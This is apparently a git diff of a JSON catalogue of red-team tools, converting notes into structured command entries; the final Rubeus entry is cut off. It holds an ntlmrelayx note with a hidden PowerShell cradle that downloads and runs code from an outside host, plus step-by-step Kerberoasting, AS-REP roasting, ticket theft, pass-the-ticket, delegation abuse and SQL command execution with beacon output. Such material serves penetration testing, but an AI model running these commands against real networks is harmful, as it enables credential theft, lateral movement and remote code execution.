@@ -456,7 +456,7 @@
         "results": [],
         "cmd": "python3 main.py -i <ip address>",
         "requirements": {
-          "tag": "INTE"
+          "tag": "COMPUTER:IP"
         }
       },
       {
@@ -539,7 +539,7 @@
     "references": [
       "https://wiki.porchetta.industries/"
     ],
-    "latest_commit": "2023-05-13T15:23:35Z"
+    "latest_commit": "2023-05-15T07:30:58Z"
   },
   {
     "name": "cs2modrewrite",
@@ -886,7 +886,7 @@
     "detected": [],
     "content": "# FreeRDP\n\n## [[RDP]]\n```bash\nxfreerdp /u:user /p:yGWrFM9jn37K /v:pc.testdomain.local\n```\n\n# Resources\n[https://github.com/awakecoding/FreeRDP-Manuals/blob/master/User/FreeRDP-User-Manual.markdown](https://github.com/awakecoding/FreeRDP-Manuals/blob/master/User/Free[[NMAP]]\n\n\n",
     "commands": [],
-    "latest_commit": "2023-05-12T12:41:29Z"
+    "latest_commit": "2023-05-15T19:25:10Z"
   },
   {
     "name": "Get-BrowserData",
@@ -902,8 +902,30 @@
     "description": "Enumerates browser history or bookmarks for a Chrome, Internet Explorer, and/or Firefox browsers on Windows machines.",
     "undetected": [],
     "detected": [],
-    "content": "## [[Bookmarks-History]]\n```ps\n.PARAMETER Browser\n    The type of browser to enumerate, 'Chrome', 'IE', 'Firefox' or 'All'\n.PARAMETER Datatype\n    Type of data to enumerate, 'History' or 'Bookmarks'\n.PARAMETER UserName\n    Specific username to search browser information for.\n.PARAMETER Search\n    Term to search for\n\nExample:\nEnumerates bookmarks for Internet Explorer for the user 'user1' and only returns results matching the search term 'github'.\n\nGet-BrowserData -Browser All -Datatype History -UserName user1 -Search 'github'\n\n\n```\n\n",
-    "commands": [],
+    "content": "",
+    "commands": [
+      {
+        "id": "603efb47-0b5a-4dc7-b0b4-4e730d2d6e64",
+        "name": "Help",
+        "description": "",
+        "tag": "",
+        "results": [],
+        "cmd": ".PARAMETER Browser\n    The type of browser to enumerate, 'Chrome', 'IE', 'Firefox' or 'All'\n.PARAMETER Datatype\n    Type of data to enumerate, 'History' or 'Bookmarks'\n.PARAMETER UserName\n    Specific username to search browser information for.\n.PARAMETER Search\n    Term to search for"
+      },
+      {
+        "id": "fd8746d2-eef6-46b5-a2fa-3ef27f98d269",
+        "name": "Enumerates bookmarks for IE for 'user1' and filter after 'github'.",
+        "description": "",
+        "tag": "",
+        "results": [
+          "COMPUTER:BOOKMARKS"
+        ],
+        "cmd": "Get-BrowserData -Browser All -Datatype History -UserName user1 -Search 'github'",
+        "requirements": {
+          "tag": "INTEL:DOMAIN:USERS"
+        }
+      }
+    ],
     "latest_commit": "2022-10-20T10:23:08Z"
   },
   {
@@ -1823,11 +1845,50 @@
       "Linux"
     ],
     "source": "https://github.com/charlesroelli/nbtscan",
-    "description": "NBTscan is a program for scanning IP networks for NetBIOS name information. It sends NetBIOS status query to each address in supplied range and lists received information in human readable form.",
+    "description": "NBTscan is a program for scanning IP networks for NetBIOS name information. It sends NetBIOS status queries to each address in the supplied range and lists received information in human-readable form.",
     "undetected": [],
     "detected": [],
-    "content": "\n## Commands\n```cmd\nUsage:\nnbtscan [-v] [-d] [-e] [-l] [-t TIMEOUT] [-b BANDWIDTH] [-r] [-q] [-s SEPARATOR] [-m RETRANSMITS] (-f FILENAME)|(IP_OR_RANGE)\n\nOptions:\n-v      verbose output. Print all names received\n        from each host\n-d      dump packets. Print whole packet contents.\n-e      Format output in /etc/hosts format.\n-l      Format output in lmhosts format.\n        Cannot be used with -v, -s or -h options.\n-t      timeout  wait timeout milliseconds for response.\n        Default 1000.\n-b      bandwidth    Output throttling. Slow down output\n        so that it uses no more that bandwidth bps.\n        Useful on slow links, so that ougoing queries\n        don't get dropped.\n-r      use local port 137 for scans. Win95 boxes\n        respond to this only.\n        You need to be root to use this option on Unix.\n-q      Suppress banners and error messages,\n-s      separator    Script-friendly output. Don't print\n        column and record headers, separate fields with separator.\n-h      Print human-readable names for services.\n        Can only be used with -v option.\n-m      retransmits  Number of retransmits. Default 0.\n-f      filename Take IP addresses to scan from file filename.\n        -f - makes nbtscan take IP addresses from stdin.\n<scan_range>  what to scan. Can either be single IP\n        like 192.168.1.1 or\n        range of addresses in one of two forms: \n        xxx.xxx.xxx.xxx/xx or xxx.xxx.xxx.xxx-xxx.\n```\n\n## [[Vulnerable Machines]]\nScans the whole 192.168.1.0/24 network:\n> nbtscan -r 192.168.1.0/24\nScans a range from 192.168.1.25 to 192.168.1.137:\n> nbtscan 192.168.1.25-137\nScans C-class network. Prints results in script-friendly format using colon as field separator:\n> nbtscan -v -s : 192.168.1.0/24\nScans the whole 192.168.1.0/24 subnet, list all names received from each host (-v), print human-readable service names (-h):\n> nbtscan -h -v 192.168.1.0/24\n\n\n",
-    "commands": [],
+    "content": "",
+    "commands": [
+      {
+        "id": "f5f60dff-5db9-4e91-bfc6-ef010e5450f2",
+        "name": "Help",
+        "description": "",
+        "tag": "",
+        "results": [],
+        "cmd": "Usage:\nnbtscan [-v] [-d] [-e] [-l] [-t TIMEOUT] [-b BANDWIDTH] [-r] [-q] [-s SEPARATOR] [-m RETRANSMITS] (-f FILENAME)|(IP_OR_RANGE)\n\nOptions:\n-v      verbose output. Print all names received\n        from each host\n-d      dump packets. Print whole packet contents.\n-e      Format output in /etc/hosts format.\n-l      Format output in lmhosts format.\n        Cannot be used with -v, -s or -h options.\n-t      timeout  wait timeout milliseconds for response.\n        Default 1000.\n-b      bandwidth    Output throttling. Slow down output\n        so that it uses no more that bandwidth bps.\n        Useful on slow links, so that ougoing queries\n        don't get dropped.\n-r      use local port 137 for scans. Win95 boxes\n        respond to this only.\n        You need to be root to use this option on Unix.\n-q      Suppress banners and error messages,\n-s      separator    Script-friendly output. Don't print\n        column and record headers, separate fields with separator.\n-h      Print human-readable names for services.\n        Can only be used with -v option.\n-m      retransmits  Number of retransmits. Default 0.\n-f      filename Take IP addresses to scan from file filename.\n        -f - makes nbtscan take IP addresses from stdin.\n<scan_range>  what to scan. Can either be single IP\n        like 192.168.1.1 or\n        range of addresses in one of two forms: \n        xxx.xxx.xxx.xxx/xx or xxx.xxx.xxx.xxx-xxx."
+      },
+      {
+        "id": "0a58163e-9031-4310-bd3a-64aa03e6e579",
+        "name": "Scans 192.168.1.0/24 subnet",
+        "description": "",
+        "tag": "",
+        "results": [
+          "INTEL:DOMAIN:COMPUTERS"
+        ],
+        "cmd": "nbtscan -r 192.168.1.0/24"
+      },
+      {
+        "id": "c5110585-947e-4d16-af3e-9ab6028822fc",
+        "name": "Scans C-class network",
+        "description": "Prints results in script-friendly format using colon as field separator",
+        "tag": "",
+        "results": [
+          "INTEL:DOMAIN:COMPUTERS"
+        ],
+        "cmd": "nbtscan -v -s : 192.168.1.0/24"
+      },
+      {
+        "id": "d49dacf9-1f3c-4895-8567-06ef3fe628f3",
+        "name": "Scan 192.168.1.0/24 subnet with service names",
+        "description": "list all names received from each host (-v), print human-readable service names (-h)",
+        "tag": "",
+        "results": [
+          "INTEL:DOMAIN:COMPUTERS"
+        ],
+        "cmd": "nbtscan -h -v 192.168.1.0/24"
+      }
+    ],
     "latest_commit": "2016-05-26T20:16:52Z"
   },
   {
@@ -2050,7 +2111,7 @@
     "detected": [],
     "content": "## [[NTLM Relaying]]\nRun ntlmrelayx or responder.\nBy default (not provided -c) it will do `secretsdump` to dump the local SAM hashes\n``````sh\nproxychains python3 /usr/local/bin/ntlmrelayx.py -t smb://10.10.17.68 -smb2support --no-http-server --no-wcf-server\n\n# alternatively provide a command with:\n-c\n'powershell -nop -w hidden -c \"iex (new-object net.webclient).downloadstring(\\\"http://10.10.17.231:8080/b\\\")\"'\n``````\n\n",
     "commands": [],
-    "latest_commit": "2023-05-11T19:32:46Z"
+    "latest_commit": "2023-05-15T15:04:47Z"
   },
   {
     "name": "physmem2profit",
@@ -2326,8 +2387,113 @@
     "description": "SQL Exploitation Tools",
     "undetected": [],
     "detected": [],
-    "content": "# PowerUpSQL\n\n## [[Vulnerable Machines]]\n## Discovery\n- `Get-SQLInstanceDomain`\n  Searching for SPNs that begin with `MSSQL*`\n- `Get-SQLInstanceBroadcast` \n- `Get-SQLInstanceScanUDP`\n- [[BloodHound#Database Server]]\n\n```ps\nGet-SQLInstanceDomain\n\nComputerName     : srv1.edu.evil.corp\nInstance         : srv1.edu.evil.corp,1433\nDomainAccountSid : 150000[ ...snip... ]172110400\nDomainAccount    : svc_mssql\nDomainAccountCn  : MS SQL Service\nService          : MSSQLSvc\nSpn              : MSSQLSvc/srv1.edu.evil.corp:1433\nLastLogon        : 5/14/2022 2:24 PM\nDescription      :\n```\n\n## Auto information gathering\n```ps\nGet-SQLInstanceDomain | Get-SQLConnectionTest | ? { $_.Status -eq \"Accessible\" } | Get-SQLServerInfo\n```\n\n## Test Login\n```ps\nGet-SQLConnectionTest -Instance \"srv1.edu.evil.corp,1433\" | fl\n\nComputerName : srv1.edu.evil.corp\nInstance     : srv1.edu.evil.corp,1433\nStatus       : Accessible\n```\n\n## Gather information\n```ps\nGet-SQLServerInfo -Instance \"srv1.edu.evil.corp,1433\"\n\nComputerName           : srv1.edu.evil.corp\nInstance               : SRV1\nDomainName             : EDU\nServiceProcessID       : 3960\nServiceName            : MSSQLSERVER\nServiceAccount         : EDU\\svc_mssql\nAuthenticationMode     : Windows Authentication\nForcedEncryption       : 0\nClustered              : No\nSQLServerVersionNumber : 13.0.5026.0\nSQLServerMajorVersion  : 2019\nSQLServerEdition       : Standard Edition (64-bit)\nSQLServerServicePack   : SP2\nOSArchitecture         : X64\nOsMachineType          : ServerNT\nOSVersionName          : Windows Server 2016 Datacenter\nOsVersionNumber        : SQL\nCurrentlogin           : EDU\\john\nIsSysadmin             : Yes\nActiveSessions         : 1\n```\n\n## SQL Query\n```ps\nGet-SQLQuery -Instance \"srv1.edu.evil.corp,1433\" -Query \"select @@servername\"\n\nColumn1\n-------\nSRV1\n```\n\n## [[SQL Command Execution]]\n### Command Execution\n```ps\nInvoke-SQLOSCmd -Instance \"srv1.edu.evil.corp,1433\" -Command \"whoami\" -RawResults\n\nedu\\svc_mssql\n```\n\n## [[SQL Lateral Movement]]\n### Crawl SQL Server Link\nManually querying databases to find links can be cumbersome and time-consuming, so you can also use `Get-SQLServerLinkCrawl` to automatically crawl all available links.\n```ps\nGet-SQLServerLinkCrawl -Instance \"srv1.edu.evil.corp,1433\"\n\nVersion     : SQL Server 2016 \nInstance    : SRV1\nCustomQuery : \nSysadmin    : 1\nPath        : {SRV1}\nUser        : EDU\\john\nLinks       : {SQL-1.EVIL.CORP}\n\nVersion     : SQL Server 2016 \nInstance    : SQL-1\nCustomQuery : \nSysadmin    : 1\nPath        : {SRV1, SQL-1.EVIL.CORP}\nUser        : sa\nLinks       : {SQL01.evil.external}\n\nVersion     : SQL Server 2019 \nInstance    : SQL01\\SQLEXPRESS\nCustomQuery : \nSysadmin    : 1\nPath        : {SRV1, SQL-1.EVIL.CORP, SQL01.evil.external}\nUser        : sa\nLinks       :\n```\n\n",
-    "commands": [],
+    "content": "",
+    "commands": [
+      {
+        "id": "c225c0b5-0f0d-4c88-b72e-a2f39022f885",
+        "name": "Get SQL-Server via SPN",
+        "description": "Searching for SPNs that begin with MSSQL*",
+        "tag": "",
+        "results": [
+          "SERVICE:SQL"
+        ],
+        "cmd": "Get-SQLInstanceDomain\n\nComputerName     : srv1.edu.evil.corp\nInstance         : srv1.edu.evil.corp,1433\nDomainAccountSid : 150000[ ...snip... ]172110400\nDomainAccount    : svc_mssql\nDomainAccountCn  : MS SQL Service\nService          : MSSQLSvc\nSpn              : MSSQLSvc/srv1.edu.evil.corp:1433\nLastLogon        : 5/14/2022 2:24 PM\nDescription      :"
+      },
+      {
+        "id": "498e5c7a-71be-4547-944e-741622d795e1",
+        "name": "Get SQL-Server via Broadcast",
+        "description": "",
+        "tag": "",
+        "results": [
+          "SERVICE:SQL"
+        ],
+        "cmd": "Get-SQLInstanceBroadcast"
+      },
+      {
+        "id": "c78f6db7-b5d7-492c-8a29-93b220195862",
+        "name": "Get SQL-Server via UDP scan",
+        "description": "",
+        "tag": "",
+        "results": [
+          "SERVICE:SQL"
+        ],
+        "cmd": "Get-SQLInstanceScanUDP"
+      },
+      {
+        "id": "1178765f-8d1e-49b8-9354-8d67e1d7cfa7",
+        "name": "Get SQL-Server Information",
+        "description": "",
+        "tag": "",
+        "results": [
+          "SERVICE:SQL:INFO"
+        ],
+        "cmd": "Get-SQLInstanceDomain | Get-SQLConnectionTest | ? { $_.Status -eq \"Accessible\" } | Get-SQLServerInfo\n",
+        "requirements": {
+          "tag": "SERVICE:SQL"
+        }
+      },
+      {
+        "id": "b2b091f4-3ef8-45a4-880a-1c76f39ee0e2",
+        "name": "Test login",
+        "description": "",
+        "tag": "",
+        "results": [
+          "CRED:PASS:PLAIN"
+        ],
+        "cmd": "Get-SQLConnectionTest -Instance \"srv1.edu.evil.corp,1433\" | fl\n\nComputerName : srv1.edu.evil.corp\nInstance     : srv1.edu.evil.corp,1433\nStatus       : Accessible",
+        "requirements": {
+          "tag": "SERVICE:SQL"
+        }
+      },
+      {
+        "id": "2dd747b0-646a-4ccc-9418-7e613e0dd947",
+        "name": "Get SQL-Server information",
+        "description": "",
+        "tag": "",
+        "results": [],
+        "cmd": "Get-SQLServerInfo -Instance \"srv1.edu.evil.corp,1433\"\n\nComputerName           : srv1.edu.evil.corp\nInstance               : SRV1\nDomainName             : EDU\nServiceProcessID       : 3960\nServiceName            : MSSQLSERVER\nServiceAccount         : EDU\\svc_mssql\nAuthenticationMode     : Windows Authentication\nForcedEncryption       : 0\nClustered              : No\nSQLServerVersionNumber : 13.0.5026.0\nSQLServerMajorVersion  : 2019\nSQLServerEdition       : Standard Edition (64-bit)\nSQLServerServicePack   : SP2\nOSArchitecture         : X64\nOsMachineType          : ServerNT\nOSVersionName          : Windows Server 2016 Datacenter\nOsVersionNumber        : SQL\nCurrentlogin           : EDU\\john\nIsSysadmin             : Yes\nActiveSessions         : 1",
+        "requirements": {
+          "tag": "SERVICE:SQL"
+        }
+      },
+      {
+        "id": "7f54233d-02a5-4f22-9451-f74ee2824a69",
+        "name": "Query SQL",
+        "description": "",
+        "tag": "",
+        "results": [],
+        "cmd": "Get-SQLQuery -Instance \"srv1.edu.evil.corp,1433\" -Query \"select @@servername\"\n\nColumn1\n-------\nSRV1",
+        "requirements": {
+          "tag": "SERVICE:SQL"
+        }
+      },
+      {
+        "id": "1c9e311e-e639-43fd-8baa-8fe14ad50ca3",
+        "name": "SQL Command Execution",
+        "description": "",
+        "tag": "",
+        "results": [
+          "EXECUTION:REMOTE"
+        ],
+        "cmd": "Invoke-SQLOSCmd -Instance \"srv1.edu.evil.corp,1433\" -Command \"whoami\" -RawResults\n\nedu\\svc_mssql",
+        "requirements": {
+          "tag": "SERVICE:SQL"
+        }
+      },
+      {
+        "id": "86910ee4-5915-4035-bef3-7d866b6ba9d4",
+        "name": "Get SQL-Server Link",
+        "description": "Manually querying databases to find links can be cumbersome and time-consuming, so you can also use Get-SQLServerLinkCrawl to automatically crawl all available links.",
+        "tag": "",
+        "results": [
+          "SERVICE:SQL:LINK"
+        ],
+        "cmd": "Get-SQLServerLinkCrawl -Instance \"srv1.edu.evil.corp,1433\"\n\nVersion     : SQL Server 2016 \nInstance    : SRV1\nCustomQuery : \nSysadmin    : 1\nPath        : {SRV1}\nUser        : EDU\\john\nLinks       : {SQL-1.EVIL.CORP}\n\nVersion     : SQL Server 2016 \nInstance    : SQL-1\nCustomQuery : \nSysadmin    : 1\nPath        : {SRV1, SQL-1.EVIL.CORP}\nUser        : sa\nLinks       : {SQL01.evil.external}\n\nVersion     : SQL Server 2019 \nInstance    : SQL01\\SQLEXPRESS\nCustomQuery : \nSysadmin    : 1\nPath        : {SRV1, SQL-1.EVIL.CORP, SQL01.evil.external}\nUser        : sa\nLinks       :",
+        "requirements": {
+          "tag": "SERVICE:SQL"
+        }
+      }
+    ],
     "latest_commit": "2022-12-26T22:59:48Z"
   },
   {
@@ -2388,7 +2554,7 @@
     "detected": [],
     "content": "# Process Hacker\n\n## [[DLL Sideloading]] [[COM Hijacking]]\n\n",
     "commands": [],
-    "latest_commit": "2023-05-11T04:48:49Z"
+    "latest_commit": "2023-05-15T18:48:51Z"
   },
   {
     "name": "Process Monitor",
@@ -2624,8 +2790,48 @@
     "description": "tool for executing client side MS-RPC functions",
     "undetected": [],
     "detected": [],
-    "content": "\n## [[User enum]]\nEnumerate users present on a system\n```\nproxychains rpcclient 10.0.1.10 -U testuser -P pw\nenumdomusers\n```\n\nEnumerate the user\n`queryuser testuser`\n\n\nEnumerate the current users privs\n`enumprivs`\n\n\n\n",
-    "commands": []
+    "content": "\n## [[User enum]]\nEnumerate users present on a system\n'''\nproxychains rpcclient 10.0.1.10 -U testuser -P pw\nenumdomusers\n'''\n\nEnumerate the user\n'queryuser testuser'\n\n\nEnumerate the current users privs\n'enumprivs'\n\n\n\n",
+    "commands": [
+      {
+        "id": "4452fd82-16b0-492c-aef1-5214ec954d8d",
+        "name": "Get users on remote system",
+        "description": "",
+        "tag": "",
+        "results": [
+          "COMPUTER:USERS"
+        ],
+        "cmd": "rpcclient 10.0.1.10 -U testuser -P pw enumdomusers",
+        "requirements": {
+          "tag": "SERVICE:RPC"
+        }
+      },
+      {
+        "id": "dd980c91-8f5e-4f1a-a737-96419f85fe93",
+        "name": "Get user X details on remote system",
+        "description": "",
+        "tag": "",
+        "results": [
+          "COMPUTER:USERS"
+        ],
+        "cmd": "rpcclient 10.0.1.10 -U testuser -P pw queryuser testuser",
+        "requirements": {
+          "tag": "SERVICE:RPC"
+        }
+      },
+      {
+        "id": "1341f02b-b373-4970-9b0c-cfffe538cb7a",
+        "name": "Get current user privs",
+        "description": "Enumerate the current users privs",
+        "tag": "",
+        "results": [
+          "PRIVS"
+        ],
+        "cmd": "rpcclient 10.0.1.10 -U testuser -P pw enumprivs",
+        "requirements": {
+          "tag": "SERVICE:RPC"
+        }
+      }
+    ]
   },
   {
     "name": "Rubeus",
@@ -2645,7 +2851,7 @@
     "detected": [],
     "content": "# Rubeus\n\n## Request TGT and inject into sacrificial process\n1. Check permissions\n``````beacon\nbeacon> getuid\n[*] You are NT AUTHORITY\\SYSTEM (admin)\n``````\n2.  Ask for TGT with aes256 hash gathered via [[eKeys]] or [[LSASS dumping]] and create a new logon session\n``````beacon\nexecute-assembly C:\\Tools\\Rubeus\\Rubeus\\bin\\Debug\\Rubeus.exe asktgt /user:doe /domain:edu.evil.corp /aes256:a561a175e395758550c9123c748a512b4b5eb1a211cbd12a1b139869f0c94ec1 /nowrap /opsec /createnetonly:C:\\Windows\\System32\\cmd.exe\n\n[*] Action: Ask TGT\n[*] Showing process : False\n[+] Process         : 'C:\\Windows\\System32\\cmd.exe' successfully created with LOGON_TYPE = 9\n[+] ProcessID       : 3044\n[+] LUID            : 0x85a103\n\n[*] Using domain controller: dc-2.edu.evil.corp (10.10.17.71)\n[*] Using aes256_cts_hmac_sha1 hash: a561a175e395758550c9123c748a512b4b5eb1a211cbd12a1b139869f0c94ec1\n[*] Building AS-REQ (w/ preauth) for: 'edu.evil.corp\\doe'\n[*] Target LUID : 8757507\n[+] TGT request successful!\n[*] base64(ticket.kirbi):\n\n [...ticket...]\n\n[*] Target LUID: 0x85a103\n[+] Ticket successfully imported!\n\n  ServiceName           :  krbtgt/edu.evil.corp\n  ServiceRealm          :  edu.evil.corp\n  UserName              :  doe\n  UserRealm             :  edu.evil.corp\n  StartTime             :  3/4/2022 12:48:16 PM\n  EndTime               :  3/4/2022 10:48:16 PM\n  RenewTill             :  3/11/2022 12:48:16 PM\n  Flags                 :  name_canonicalize, pre_authent, initial, renewable, forwardable\n  KeyType               :  aes256_cts_hmac_sha1\n  Base64(key)           :  Jr93ezQ6z+rc0/1h30UXaGxVkRLVsWSl9mG0nNeXuTU=\n``````\n3. Steal the logon session token\n``````beacon\nbeacon> steal_token 3044\n[+] Impersonated NT AUTHORITY\\SYSTEM\n\nbeacon> ls \\\\srv2\\c$\n\n Size     Type    Last Modified         Name\n ----     ----    -------------         ----\n dir     05/10/2022 04:11:30   $Recycle.Bin\n dir     05/10/2022 03:23:44   Boot\n ``````\n\n## Extract Kerberos Tickets\n1. Make sure the Service is krbtgt/domain and note down the LUID\n``````Rubeus\nbeacon> execute-assembly C:\\Tools\\Rubeus\\Rubeus\\bin\\Debug\\Rubeus.exe triage\n\nAction: Triage Kerberos Tickets (All Users)\n\n[*] Current LUID    : 0x3e7\n\n ------------------------------------------------------------------------------\n| LUID     | UserName                     | Service                                       | EndTime               |\n ------------------------------------------------------------------------------\n | 0x462eb | doe @ edu.evil.corp    | krbtgt/edu.evil.corp                      | 5/12/2022 12:34:03 AM |\n | 0x25ff6 | john @ edu.evil.corp  | krbtgt/edu.evil.corp                      | 5/12/2022 12:33:41 AM |\n ------------------------------------------------------------------------------\n ``````\n2. Extract the ticket\n``````beacon\nbeacon> execute-assembly C:\\Tools\\Rubeus\\Rubeus\\bin\\Debug\\Rubeus.exe dump /service:krbtgt /luid:0x462eb /nowrap\n\n[*] Target service  : krbtgt\n[*] Target LUID     : 0x462eb\n[*] Current LUID    : 0x3e7\n\n  UserName                 : doe\n  Domain                   : EDU\n  LogonId                  : 0x462eb\n  UserSID                  : S-1-5-21-3263068140-2042698922-2891547269-1122\n  AuthenticationPackage    : Kerberos\n  LogonType                : Interactive\n  LogonTime                : 5/11/2022 2:34:03 PM\n  LogonServer              : DC-2\n  LogonServerDNSDomain     : edu.evil.corp\n  UserPrincipalName        : doe@edu.evil.corp\n\n ServiceName           :  krbtgt/edu.evil.corp\n ServiceRealm          :  edu.evil.corp\n UserName              :  doe\n UserRealm             :  edu.evil.corp\n StartTime             :  5/11/2022 2:34:03 PM\n EndTime               :  5/12/2022 12:34:03 AM\n RenewTill             :  5/18/2022 2:34:03 PM\n Flags                 :  name_canonicalize, pre_authent, initial, renewable, forwardable\n KeyType               :  aes256_cts_hmac_sha1\n Base64(key)           :  oh0gqFF8D81ijGlce+jyc0yMtHYaDrl8AM0b4+BqO8E=\n Base64EncodedTicket   :\n\n [...ticket...]\n``````\n3. Create a sacrificial logon session or use \n``````beacon\nbeacon> execute-assembly C:\\Tools\\Rubeus\\Rubeus\\bin\\Debug\\Rubeus.exe createnetonly /program:C:\\Windows\\System32\\cmd.exe\n\n[*] Action: Create Process (/netonly)\n[*] Showing process : False\n[+] Process         : 'C:\\Windows\\System32\\cmd.exe' successfully created with LOGON_TYPE = 9\n[+] ProcessID       : 4872\n[+] LUID            : 0x92a8c\n``````\n4. Use [[Pass-the-Ticket]] to pass the extracted TGT into the logon session via /luid\n``````beacon\nexecute-assembly C:\\Tools\\Rubeus\\Rubeus\\bin\\Debug\\Rubeus.exe ptt /luid:0x92a8c /ticket:[...base64-ticket...]\n\n[*] Action: Import Ticket\n[*] Target LUID: 0x92a8c\n[+] Ticket successfully imported!\n``````\n5. Steal the access token\n``````beacon\nsteal_token 4872\n[+] Impersonated NT AUTHORITY\\SYSTEM\n\nbeacon> ls \\\\srv2\\c$\n\n Size     Type    Last Modified         Name\n ----     ----    -------------         ----\n dir     05/10/2022 04:11:30   $Recycle.Bin\n dir     05/10/2022 03:23:44   Boot\n ``````\n\n## Make_token / new logon session\n```beacon\nmake_token EXT\\i.wood abcdefg\nexecute-assembly C:\\Tools\\Rubeus\\Rubeus\\bin\\Debug\\Rubeus.exe ptt /ticket:awdawd\n```\n\n## [[Kerberoasting]]\n\u26a0\ufe0f This will kerberoast ALL accounts with SPN's!\n#OPSEC only do targeted kerberoast\n``````beacon\nbeacon> execute-assembly C:\\Tools\\Rubeus\\Rubeus\\bin\\Debug\\Rubeus.exe kerberoast /simple /nowrap\n\n[*] Action: Kerberoasting\n[*] Searching the current domain for Kerberoastable users\n[*] Total kerberoastable users : 2\n\n$krb5tgs$23$*svc_mssql$edu.evil.corp$MSSQLSvc/srv1.edu.evil.corp:1433*$[...hash...]\n$krb5tgs$23$*svc_honey$edu.evil.corp$HoneySvc/fake.edu.evil.corp*$[...hash...]\n``````\n\n## Targeted [[Kerberoasting]]\n1. Identify users: [[ADSearch#Identify kerberoastable Users]]\n2. Targeted [[Kerberoasting]]\n``````beacon\nbeacon> execute-assembly C:\\Tools\\Rubeus\\Rubeus\\bin\\Debug\\Rubeus.exe kerberoast /user:svc_mssql /nowrap\n\n[*] Action: Kerberoasting\n[*] Target User            : svc_mssql\n[*] Searching the current domain for Kerberoastable users\n[*] Total kerberoastable users : 1\n[*] SamAccountName         : svc_mssql\n[*] DistinguishedName      : CN=MS SQL Service,CN=Users,DC=edu,DC=evil,DC=corp\n[*] ServicePrincipalName   : MSSQLSvc/srv1.edu.evil.corp:1433\n[*] PwdLastSet             : 5/14/2022 1:28:34 PM\n[*] Supported ETypes       : RC4_HMAC_DEFAULT\n[*] Hash                   : $krb5tgs$23$*svc_mssql$edu.evil.corp$MSSQLSvc/srv1.edu.evil.corp:1433*$[...hash...]\n``````\n3. Cracking with [[Hashcat#Cracking krb5tgs]]\n\n## [[AS-REP Roasting]]\n1. Identify users: [[ADSearch#Identify as-rep roastable user]]\n2. [[AS-REP Roasting]]\n``````beacon\nbeacon> execute-assembly C:\\Tools\\Rubeus\\Rubeus\\bin\\Debug\\Rubeus.exe asreproast /user:svc_oracle /nowrap\n\n[*] Action: AS-REP roasting\n\n[*] Target User            : svc_oracle\n[*] Target Domain          : edu.evil.corp\n\n[*] Searching path 'LDAP://dc-2.edu.evil.corp/DC=edu,DC=evil,DC=corp' for AS-REP roastable users\n[*] SamAccountName         : svc_oracle\n[*] DistinguishedName      : CN=Oracle Service,CN=Users,DC=edu,DC=evil,DC=corp\n[*] Using domain controller: dc-2.edu.evil.corp (10.10.17.71)\n[*] Building AS-REQ (w/o preauth) for: 'edu.evil.corp\\svc_oracle'\n[+] AS-REQ w/o preauth successful!\n[*] AS-REP hash:\n\n $krb5asrep$svc_oracle@edu.evil.corp:F3B1A1 [...snip...] D6D049\n``````\n3. Cracking with [[Hashcat#Cracking krb5asrep]]\n\n## [[Unconstrained Delegation]]\nRequires Admin\nMonitor with [[Rubeus]] for new cached TGT's\n``````beacon\nbeacon> execute-assembly C:\\Tools\\Rubeus\\Rubeus\\bin\\Debug\\Rubeus.exe monitor /targetuser:patrick /interval:10\n\n[*] Action: TGT Monitoring\n[*] Target user     : patrick\n[*] Monitoring every 10 seconds for new TGTs\n\njobs\n\njobkill 1\n``````\n\nWrite the base64 decoded string to a `.kirbi` file, create a new sacrificial logon session, pass the TGT [[Overpass-the-Hash#Manual]]\n\n## [[Constrained Delegation]]\nRequire Admin\n1. Gather computer aes256 hash via [[eKeys]]\n2. Automatically request TGS for specific service\nWhere:\n- `/impersonateuser` is the user we want to impersonate. `patrick` is a domain admin but you want to ensure this user has local admin access to the target (WKSTN2).\n- `/msdsspn` is the service principal name that SRV2 is allowed to delegate to.\n- `/user` is the principal allowed to perform the delegation.\n- `/aes256` is the AES256 key of the `/user`.\n- `/opsec` tells Rubeus to more closely mimic genuine S4U2Self and S4U2Proxy requests (can only be used with `aes256`).\n- `/ptt` [[Pass-the-Ticket]], tells Rubeus to pass the generated tickets directly into the current logon session.\n``````beacon\nbeacon> execute-assembly C:\\Tools\\Rubeus\\Rubeus\\bin\\Debug\\Rubeus.exe s4u /impersonateuser:patrick /msdsspn:cifs/wkstn2.edu.evil.corp /user:srv2$ /aes256:babf31e0d787aac5c9cc0ef38c51bab5a2d2ece608181fb5f1d492ea55f61f05 /opsec /ptt\n\n[*] Action: S4U\n\n[*] Using domain controller: dc-2.edu.evil.corp (10.10.17.71)\n[*] Using aes256_cts_hmac_sha1 hash: 952891c9933c675cbbc2186f10e934ddd85ab3abc3f4d2fc2f7e74fcdd01239d\n[*] Building AS-REQ (w/ preauth) for: 'edu.evil.corp\\srv2$'\n[+] TGT request successful!\n[*] base64(ticket.kirbi):\n\n doIFLD [...snip...] MuSU8=\n\n[*] Action: S4U\n\n[*] Using domain controller: dc-2.edu.evil.corp (10.10.17.71)\n[*] Building S4U2self request for: 'SRV2$@edu.evil.corp'\n[+] Sequence number is: 1703507608\n[*] Sending S4U2self request\n[+] S4U2self success!\n[*] Got a TGS for 'patrick' to 'SRV2$@edu.evil.corp'\n[*] base64(ticket.kirbi):\n\n doIFfj [...snip...] JWLTIk\n\n[*] Impersonating user 'patrick' to target SPN 'cifs/wkstn2.edu.evil.corp'\n[*] Using domain controller: dc-2.edu.evil.corp (10.10.17.71)\n[*] Building S4U2proxy request for service: 'cifs/wkstn2.edu.evil.corp'\n[+] Sequence number is: 326551889\n[*] Sending S4U2proxy request\n[+] S4U2proxy success!\n[*] base64(ticket.kirbi) for SPN 'cifs/wkstn2.edu.evil.corp':\n\n doIGwj [..snip...] ljLmlv\n\n[+] Ticket successfully imported!\n\nbeacon> ls \\\\wkstn2.edu.evil.corp\\c$\n  \n Size     Type    Last Modified         Name\n ----     ----    -------------         ----\n dir     05/19/2022 14:35:19   $Recycle.Bin\n dir     05/10/2022 03:23:44   Boot\n``````\n\n## Alternate Service Name\nThis is an special case of [[Constrained Delegation]], were the service is not useful.\nWe can request a TGS for any service run by DC-2, using `/altservice` flag in Rubeus.\n``````beacon\nbeacon> execute-assembly C:\\Tools\\Rubeus\\Rubeus\\bin\\Debug\\Rubeus.exe s4u /impersonateuser:Administrator /msdsspn:eventlog/dc-2.edu.evil.corp /altservice:cifs /user:srv2$ /aes256:babf31e0d787aac5c9cc0ef38c51bab5a2d2ece608181fb5f1d492ea55f61f05 /opsec /ptt\n\n[*] Action: S4U\n\n[*] Using domain controller: dc-2.edu.evil.corp (10.10.17.71)\n[*] Using aes256-cts-hmac-sha1 hash: 